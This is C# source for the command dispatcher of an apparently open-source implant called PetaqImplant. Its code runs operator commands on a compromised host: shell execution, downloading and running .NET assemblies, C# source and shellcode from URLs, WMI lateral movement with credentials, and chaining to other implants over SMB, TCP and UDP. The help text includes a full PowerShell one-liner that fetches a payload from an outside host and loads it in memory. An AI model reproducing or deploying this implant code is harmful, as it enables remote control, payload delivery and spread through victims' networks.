using System;
using System.Text;
using System.Text.RegularExpressions;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Concurrent;
using System.Threading;
using System.Security.Cryptography;

namespace PetaqImplant
{
    public class Instructions
    {

        public static void Help()
        {
            Console.WriteLine(@"The following sample instructions are available:
Examples:
    exec cmd /c dir
    exec-sharpassembly url http://127.0.0.1/Seatbelt.exe BasicOSInfo
    exec-sharpassembly url http://127.0.0.1/test.exe
    exec-sharpcode base64 http://127.0.0.1/test.b64
    exec-sharpcode url http://127.0.0.1/test.cs
    exec-sharpcode base64 http://127.0.0.1/test.cs.b64
    exec-sharpdirect Console.WriteLine(""test 1234"");
    link tcp://127.0.0.1/8002
    link udp://127.0.0.1/8002
    link smb://127.0.0.1
    link smb://127.0.0.1/petaq_comm

Link operations:
    route
    sessions
    link URI
    unlink ID

Lateral movement:
    lateralmovement wmiexec domain=galaxy username=administrator password=Password3 host=10.0.0.1 command=""powershell –c $m = new- object net.webclient;$Url = 'http://172.16.121.1';$dba =$m.downloaddata($Url);$a =[System.Reflection.Assembly]::Load($dba); $a.EntryPoint.Invoke(0,@(,[string[]]@()))""

Execute a command/binary:
    exec cmd.exe /c dir
    exec powershell -c Write-Output($env:UserName)

Execute a command/binary/assembly as a thread (no wait, no output):
    execthread cmd.exe /c dir
    execthread powershell -c Write-Output($env:UserName)
    execthread-sharpassembly url http://127.0.0.1/Assembly.exe Parameters
    execthread-sharpassembly base64 http://127.0.0.1/Assembly.b64 Parameters
    execthread-sharpcode url http://127.0.0.1/Sharpcode.src Parameters
    execthread-sharpcode base64 BASE64_ENCODED_SHARPCODE Parameters

Inline run for .NET source code:
    exec-sharpdirect SHARPCODE
    exec-sharpdirect base64 BASE64_ENCODED_SHARPCODE

Execute a .NET assembly:
    exec-sharpassembly url http://127.0.0.1/Assembly.exe Parameters
    exec-sharpassembly base64 http://127.0.0.1/Assembly.b64 Parameters

Compile & Execute .NET source code:
    exec-sharpcode url http://127.0.0.1/Sharpcode.src Parameters
    exec-sharpcode base64 BASE64_ENCODED_SHARPCODE Parameters
    
Execute Shellcode:
    exec-shellcode url http://127.0.0.1/Shellcode.bin ARCH64 T1
    exec-shellcode url http://127.0.0.1/Shellcode.bin ARCH32 T2
    exec-shellcode base64 http://127.0.0.1/Shellcode.b64 ARCH64 T1
    exec-shellcode base64 http://127.0.0.1/Shellcode.b64 ARCH32 T2
Exit:
    exit
    terminate");
        }
        public static void Instruct(string instructions)
        {

            // spliting the instructions to string[]
            string[] args = Regex.Split(instructions, " ");

            // Set the socket as the Console output
            Program.consoleIO = Console.Out;
            Console.SetOut(new SocketWriter());

            if (args.Length == 0)
            {
                Console.WriteLine("No instructions?");
                Help();
            }
            else
            {
                WebClient client = Common.GetWebClient();
                try
                {
                    string dataToSend = "";
                    switch (args[0])
                    {
                        case "help":
                            Help();
                            break;
                        case "register":                            
                            Console.Error.WriteLine("Registering the implant information.");
                            //string registration_data = "register " + Convert.ToBase64String(Encoding.UTF8.GetBytes(Common.GetInfo()));
                            //Console.WriteLine(registration_data);

                            // register the implant information
                            Program.Register();

                            // regist the the linked implants
                            Program.RegisterLinkedImplants();

                            // ask registration from all linked implants
                            Program.AskRegistrationsFromAllLinkedImplants();

                            // ask route updates from all linked implants
                            Program.AskRouteUpdatesFromAllLinkedImplants();

                            Console.Error.WriteLine("Registration is complete.");

                            break;
                        case "routeupdates":
                            Console.WriteLine("Route updates is sending...");
                            Console.WriteLine("routeupdates");
                            break;

                        case "routeremove":
                            if (args.Length > 1 && Program.implantRoutes.ContainsKey(args[1]))
                            {
                                string rrid = args[1];
                                Console.WriteLine("{0} is removing from the routing table...", rrid);
                                Program.implantRoutes.TryRemove(rrid, out string rridvalue);
                            }
                            else
                            {
                                Console.WriteLine("Session is not linked.");
                            }

                            break;

                        case "lateralmovement":
                            Console.WriteLine("Lateral movement starting...");
                            Dictionary<string, string> options = new Dictionary<string, string>();
                            switch (args[1])
                            {
                                case "wmiexec":
                                    // lateralmovement wmiexec domain=DOM username=USER password=PASS host=127.1 command="powershell -c asssd"
                                    Console.WriteLine("instuctions: {0}",instructions);
                                    string command = Regex.Split(instructions, "\"")[1];
                                    args = Regex.Split(Regex.Split(instructions, "\"")[0], " ");

                                    for (int i = 2; i < args.Length; i++)
                                    {
                                        // get the parameters
                                        string var = Regex.Split(args[i], "=")[0];
                                        string val = Regex.Split(args[i], "=")[1];
                                        // make the parameters a dictonary
                                        if (var != "command")
                                        {
                                            options.Add(var, val);
                                            Console.WriteLine("{0} => {1}", var, val);
                                        }
                                        else
                                        {
                                            Console.WriteLine("Command is adding...");
                                            options.Add("command", command);
                                            Console.WriteLine("command => {0}", command);
                                        }
                                    }
                                    Console.WriteLine("The parameters are processing...");
                                    // call WMI
                                    LateralMovementWMI lm = new LateralMovementWMI();
                                    lm.Connect(options);
                                    break;

                                //wmiquery will be added soon
                                //case "wmiquery":
                                //    for (int i = 2; i < args.Length; i++)
                                //    {
                                //        // get the parameters
                                //        string var = Regex.Split(args[i], "=")[0];
                                //        string val = Regex.Split(args[i], "=")[1];
                                //        // make the parameters a dictonary
                                //        options.Add(var, val);
                                //        Console.WriteLine("{0} => {1}", var, val);
                                //    }
                                //    // call WMI
                                //    LateralMovementWMI lmq = new LateralMovementWMI();
                                //    lmq.Connect(options);
                                //    break;
                                default:
                                    Console.WriteLine("Lateral movement method is not supported");
                                    break;
                            }
                            break;
                        case "link":
                            if (args.Length < 2)
                            {
                                dataToSend += "Remote host and link type are missing. Example usages:\n" +
                                    "* link smb://192.168.1.1\n" +
                                    "* link smb://192.168.1.1/NamedPipeName\n" +
                                    "* link tcp://192.168.1.1/8002\n" +
                                    "* link udp://192.168.1.1/8002\n";
                            }
                            else
                            {                                
                                string[] protos = { "smb", "tcp", "udp" };
                                if ( ! Array.Exists(protos, element => element == Regex.Split(args[1], ":")[0] )) {
                                    dataToSend += "Unsupported link protocol.";
                                }
                                else
                                {
                                    string link_uri = args[1];
                                    // new implant linking
                                    LinkedImplant linked_implant = new LinkedImplant(link_uri);
                                    // linked implant added to the list
                                    Program.LinkedImplants.Add(linked_implant.sessionId, linked_implant);
                                    // no route information necessary for the linked implants
                                    // sending the registration data to the linked service
                                    dataToSend += "Implant linking started for " + link_uri + " as " + linked_implant.sessionId;

                                }
                            }
                            Console.WriteLine(dataToSend);
                            break;
                        case "sessions":
                            if (Program.LinkedImplants.Count == 0) { Console.WriteLine("No implant linked."); break; }
                            dataToSend += "Linked session(s):\n";
                            foreach (KeyValuePair<string, LinkedImplant> linked_implant in Program.LinkedImplants)
                            {
                                dataToSend += linked_implant.Key + "\t" + linked_implant.Value.implantObject.Status + "\n";
                            }

                            Console.WriteLine(dataToSend);
                            break;

                        case "route":
                            if (Program.implantRoutes.Count == 0) { Console.WriteLine("Routing table is empty."); break; }
                            dataToSend += "Routing table:\n";
                            foreach (KeyValuePair<string, string> r in Program.implantRoutes)
                            {
                                dataToSend += r.Key + " is linked through " + r.Value + ".\n";
                            }
                            Console.WriteLine(dataToSend);
                            break;
                        case "transmit":
                            if (args.Length < 2)
                            {
                                Console.WriteLine("Session ID and command are missing. Example usage:\n" +
                                    "* transmit SESSIONID COMMAND\n");
                            }
                            else
                            {
                                string sessionId = args[1];
                                string cmd = String.Join(" ", args.SubArray(2, (args.Length - 2)));
                                string instruction = Common.Encrypt(cmd);
                                Console.WriteLine("The instruction is routing via {0}", sessionId);
                                if (Program.LinkedImplants.ContainsKey(sessionId))
                                {
                                    // session ID is in the linked implants table, so transmitting it
                                    LinkedImplant linked_implant = Program.LinkedImplants[sessionId];
                                    if (linked_implant.implantObject.Status)
                                    {
                                        Console.WriteLine("The instruction is sending to the linked implant.\n{0}", cmd);
                                        linked_implant.implantObject.Send(instruction);
                                    }
                                    else { Console.WriteLine("Session is disconnected."); }
                                }
                                else
                                {
                                    if (Program.implantRoutes.ContainsKey(sessionId))
                                    {
                                        // session ID is in the routing table, so transmitting it via next hop
                                        LinkedImplant linked_implant = Program.LinkedImplants[Program.implantRoutes[sessionId]];
                                        if (linked_implant.implantObject.Status)
                                        {
                                            Console.WriteLine("The instruction is routing via {0}.\n{1}", Program.implantRoutes[sessionId], instructions);
                                            linked_implant.implantObject.Send(Common.Encrypt(instructions));
                                        }
                                        else { Console.WriteLine("Session is disconnected."); }
                                    }
                                    else { Console.WriteLine("Invalid session ID"); }
                                }
                            }

                            break;
                        case "unlink":
                            if (args.Length < 2)
                            {
                                Console.WriteLine("Session ID is missing. Example usage:\n" +
                                    "* unlink SESSIONID\n");
                            }
                            else
                            {
                                string sid = args[1];
                                if (Program.LinkedImplants.ContainsKey(sid)) {
                                    if (Program.LinkedImplants[sid].implantObject.Status)
                                    {
                                        Console.WriteLine("Disconnecting {0}", sid);
                                        Program.LinkedImplants[sid].implantObject.Disconnect();
                                    }
                                    else
                                    {
                                        Console.WriteLine("Session is already disconnected.");
                                    }
                                    Console.WriteLine("{0} is removing from the sessions table...", sid);
                                    Program.LinkedImplants.Remove(sid);
                                    Console.WriteLine("{0} is removing from the routing table...", sid);
                                    Program.implantRoutes.TryRemove(sid, out string sidrvalue);
                                    Console.WriteLine("{0} is removing from the linked service routing table...", sid);
                                    Console.WriteLine("routeremove {0}", sid);
                                    Program.RegisterLinkedImplants();
                                }
                                else
                                {
                                    Console.WriteLine("Invalid session ID");

                                }
                            }
                            break;                       
                        case "exec":
                            if (args.Length > 2)
                            {
                                Capabilities.Exec(args[1], String.Join(" ",args.SubArray(2, (args.Length - 2))));
                            }
                            else if (args.Length == 2)
                            {
                                Capabilities.Exec(args[1], "");
                            }
                            else
                            {
                                Console.WriteLine("Missing executable name & path.");
                                Help();
                            }
                            break;
                        case "execthread":
                            if (args.Length > 2)
                            {
                                Capabilities.Exec(args[1], String.Join(" ", args.SubArray(2, (args.Length - 2))), false);
                            }
                            else if (args.Length == 2)
                            {
                                Capabilities.Exec(args[1], "", false);
                            }
                            else
                            {
                                Console.WriteLine("Missing executable name & path.");
                                Help();
                            }
                            break;
                        case "exec-sharpassembly":
                            byte[] sharpassembly;
                            string[] sharpassembly_arg;
                            if (args[1] == "url")
                            {
                                sharpassembly = client.DownloadData(args[2]);
                                sharpassembly_arg = args.SubArray(3, (args.Length - 3));
                                Capabilities.ExecSharpAssembly(sharpassembly, sharpassembly_arg);
                            }
                            else if (args[1] == "base64")
                            {
                                string base64ofasm = Encoding.UTF8.GetString(client.DownloadData(args[2]));
                                sharpassembly = Convert.FromBase64String(base64ofasm);
                                sharpassembly_arg = args.SubArray(3, (args.Length - 3));
                                Capabilities.ExecSharpAssembly(sharpassembly, sharpassembly_arg);
                            }
                            else
                            {
                                Console.WriteLine("Only url or base64 are valid for .NET assembly delivery.");
                                Help();
                            }
                            break;
                        case "execthread-sharpassembly":
                            byte[] sharpassemblyt;
                            string[] sharpassemblyt_arg;
                            if (args[1] == "url")
                            {
                                sharpassemblyt = client.DownloadData(args[2]);
                                sharpassemblyt_arg = args.SubArray(3, (args.Length - 3));
                                Capabilities.ExecSharpAssembly(sharpassemblyt, sharpassemblyt_arg,false);
                            }
                            else if (args[1] == "base64")
                            {
                                string base64ofasm = Encoding.UTF8.GetString(client.DownloadData(args[2]));
                                sharpassemblyt = Convert.FromBase64String(base64ofasm);
                                sharpassemblyt_arg = args.SubArray(3, (args.Length - 3));
                                Capabilities.ExecSharpAssembly(sharpassemblyt, sharpassemblyt_arg,false);
                            }
                            else
                            {
                                Console.WriteLine("Only url or base64 are valid for .NET assembly delivery.");
                                Help();
                            }
                            break;
                        case "exec-shellcode":
                            byte[] shellcode;
                            string shellcode_arch = args[3];
                            if (args[1] == "url")
                            {
                                shellcode = client.DownloadData(args[2]);
                                Capabilities.ExecShellcode(shellcode, shellcode_arch);
                            }
                            else if (args[1] == "base64")
                            {
                                string base64ofsc = Encoding.UTF8.GetString(client.DownloadData(args[2]));
                                shellcode = Convert.FromBase64String(base64ofsc);
                                Capabilities.ExecShellcode(shellcode, shellcode_arch);
                            }
                            else
                            {
                                Console.WriteLine("Only url or base64 are valid for shellcode delivery.");
                                Help();
                            }
                            break;
                        case "exec-sharpcode":
                            string sharpcode;
                            string[] sharpcode_arg;
                            if (args[1] == "url")
                            {
                                sharpcode = Encoding.UTF8.GetString(client.DownloadData(args[2]));
                                sharpcode_arg = args.SubArray(3, (args.Length - 3));
                                Capabilities.ExecSharpCode(sharpcode, sharpcode_arg);
                            }
                            else if (args[1] == "base64")
                            {
                                string base64ofsrc = Encoding.UTF8.GetString(client.DownloadData(args[2]));
                                sharpcode = Encoding.UTF8.GetString(Convert.FromBase64String(base64ofsrc));
                                sharpcode_arg = args.SubArray(3, (args.Length - 3));
                                Capabilities.ExecSharpCode(sharpcode, sharpcode_arg);
                            }
                            else
                            {
                                Console.WriteLine("Only url or base64 are valid for shellcode delivery.");
                                Help();
                            }
                            break;
                        case "execthread-sharpcode":
                            string sharpcodet;
                            string[] sharpcodet_arg;
                            if (args[1] == "url")
                            {
                                sharpcodet = Encoding.UTF8.GetString(client.DownloadData(args[2]));
                                sharpcodet_arg = args.SubArray(3, (args.Length - 3));
                                Capabilities.ExecSharpCode(sharpcodet, sharpcodet_arg,false);
                            }
                            else if (args[1] == "base64")
                            {
                                string base64ofsrc = Encoding.UTF8.GetString(client.DownloadData(args[2]));
                                sharpcodet = Encoding.UTF8.GetString(Convert.FromBase64String(base64ofsrc));
                                sharpcodet_arg = args.SubArray(3, (args.Length - 3));
                                Capabilities.ExecSharpCode(sharpcodet, sharpcodet_arg,false);
                            }
                            else
                            {
                                Console.WriteLine("Only url or base64 are valid for shellcode delivery.");
                                Help();
                            }
                            break;
                        case "exec-sharpdirect":
                            string code = String.Join(" ", args.SubArray(1, (args.Length - 1)));
                            string head = "using System;\npublic class Program\n {public static void Main()\n{";
                            string tail = "\n}\n}";
                            string sharpdirect = head + code + tail;
                            Capabilities.ExecSharpCode(sharpdirect, null);
                            break;
                        case "exit":
                            Program.exit = true;
                            Console.WriteLine("Exiting...");
                            if (Program.LinkService != null)
                            {
                                Program.LinkService.Stop();
                            }
                            break;
                        case "terminate":
                            Program.exit = true;
                            Program.terminate = true;
                            break;
                        default:
                            Console.WriteLine("Unknown instruction: {0}", args[0]);
                            Help();
                            break;
                    }


                }
                
                catch (Exception e)
                {
                    Console.WriteLine("Instruction failed, here is what requested:\n");
                    Console.WriteLine("Error:\n{0}",e);
                }
            }
        }
    }
}
